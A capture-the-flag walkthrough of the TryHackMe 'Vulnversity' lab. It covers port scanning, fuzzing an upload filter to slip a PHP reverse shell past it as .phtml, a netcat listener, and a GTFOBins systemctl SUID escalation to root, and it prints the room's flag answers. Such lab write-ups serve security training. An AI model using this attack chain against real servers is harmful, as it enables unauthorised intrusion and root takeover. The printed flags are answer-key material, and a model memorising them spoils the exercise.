# [Vulnversity][1]

## Reconnaissance

Start with a nmap scan 

`nmap -A <IP>` 

![Nmap](images/nmap.png)

### How many ports are open? 

> **6**

### What version of the squid proxy is running on the machine? 

> **3.5.12**

### How many ports will nmap scan if the flag *-p-400* was used? 

> **400** (Ports 1-400)

### What is the most likely operating system this machine is running? 

> **Ubuntu**

### What port is the web server running on? 

> **3333**


## Locating directories using GoBuster

Now onto a GoBuster Directory scan of the webserver.

![GoBuster](images/gobuster.png)

Opening the paths we found in a browser, we see the upload form page on /internal/

![Upload](images/upload.png)

### What is the directory that has an upload form page? 

> **/internal/**


## Compromise the webserver

Try uploading the a file with a `.txt` and `.php` extension. You'll see that these extension are not allowed. We will take advantage of Burp Suite's Intruder tool and fuzz the upload form to see which extensions it will accept.

![Extension not allowed](images/ext_not_allowed.png)

### What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.

> **.php**

1. In the `Proxy` tab, open Burp's browser and turn Intercept on
2. Navigate to the `<IP>/internal` page and upload a file
3. In Burp, you'll see the request being intercepted. Send it to `Intruder`
4. In `Intruder`, select `Sniper` as the attack type, highlight the `.extension` of your file and add a payload marker. This is the variable that will be changed in each upload attempt going through the `phpext.txt` extensions list
5. In the `Payloads` tab, load the `phpext.txt` and uncheck the URL Encoding at the bottom
6. Click Start Attack

** **NOTE: If URL encoding is left checked, the uploads will encode `.` as `%2e` and all fuzzing attempts will be unsuccessful**

![URL encoded](images/burp_encode.png)

![Disable encoded](images/disable_encode.png)

View the results and check the responses for each file extension. Only `.phtml` has a different file length and a `Success` response. This is the extension we will rename our reverse shell

![Intruder](images/intruder_success.png)

### Run this attack, what extension is allowed? 

> **.phtml**

Use `netcat` to open a socket and listen for inbound connections on port 1234.

`nc -lvnp 1234`

`l: listen mode for inbound connections`

`v: verbose`

`n: disable DNS resolution`

`p: port number`

![Netcat](images/nc_listen.png)

![Netcat options](images/nc_options.png)

Edit the `php-reverse-shell.php` file to your host IP address and the netcat port and save as `.phtml` extension.

![Shell IP](images/shell_edit.png)

Upload the reverse shell `php-reverse-shell.phtml` to the webserver. Navigate to `<IP>/internal/uploads` to see your payload and click it to execute it.

![Payload](images/phtml_upload.png)

Back in the terminal, we see our payload has established the reverse shell

![Netcat](images/nc.png)

Listing the users in the home directory shows one user `bill`

![Bill](images/bill.png)

### What is the name of the user who manages the webserver? 

> **bill**

List the files in his directory to see `user.txt` for the flag.

![Flag](images/user_flag.png)

### What is the user flag?
> **8bd7992fbe8a6ad22a63361004cfcedb**

## Privilege Escalation

Files with the `SUID` bit set temporarily allows the user to run the file as the file owner. Since we want to escalate our privilege, we want to search for files with `root` as file owner

`find / -user root -perm -u+s -exec ls -l {} \; 2>/dev/null`

`/: search from root volume`

`-user root: file owner is root`

`-perm -u+s: file has SUID set for user`

`-exec ls -l {}: execute ls -l command on each file found and \; signifies end of exec command`

`2>/dev/null: sends strerr messages to /dev/null`


![SUID](images/suid_find.png)

Doing some research into the binaries found, `/bin/systemctl` stands out as it is used to start and stop different system services. That should typically be reserved for people with admin privileges and setting the `SUID` bit on it opens a misconfiguration flaw we can exploit to elevate our privileges. 

### On the system, search for all SUID files. What file stands out? 

> **/bin/systemctl**

Looking for `systemctl` exploits on [GTFOBins][2], we find one that takes advantage of `SUID` bit being set

![GTFOBins](images/gtfobins.png)

The first line can be omitted as we are interacting with a binary that already has `SUID` set and change the path to `/bin/systemctl`

`TF=$(mktemp).service`

`echo '[Service]`

`Type=oneshot`

`ExecStart=/bin/sh -c "id > /tmp/output"`

`[Install]`

`WantedBy=multi-user.target' > $TF`

`/bin/systemctl link $TF`

`/bin/systemctl enable --now $TF`

Paste this code into the shell.

This exploit opens a shell, executes the `id` command and outputs it to `/tmp/output` so lets check the file.

![id](images/id.png)

We see that output of the `id` command shows we are `root` so we can change the `id` command to do anything!

Checking the `/` directory shows a `root` folder only accessible to `root` 

![Root denied](images/root_denied.png)

Let's try to access this folder by changing the `id` command to `ls -la /root` and check `/tmp/output` again

![Root ls](images/root_ls.png)

Final step! Change the command one last time to `cat /root/root.txt` and run it for the flag. 

![Flag](images/flag.png)

## What is the root flag value?

> **a58ff8579f0a9270368d33a9966c7fd5**


[1]: https://tryhackme.com/room/vulnversity
[2]: https://gtfobins.github.io/gtfobins/systemctl/

